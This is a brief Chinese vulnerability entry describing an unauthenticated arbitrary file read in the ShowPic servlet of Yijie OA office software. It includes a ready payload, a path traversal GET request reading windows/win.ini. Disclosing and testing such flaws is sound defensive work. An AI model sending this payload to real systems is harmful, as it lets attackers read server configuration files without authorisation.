**漏洞描述：**

易捷OA协同办公软件ShowPic接口处存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。

**影响版本：**

易捷OA协同办公软件

**Payload：**

```jsx
GET /servlet/ShowPic?filePath=../../windows/win.ini
```

---
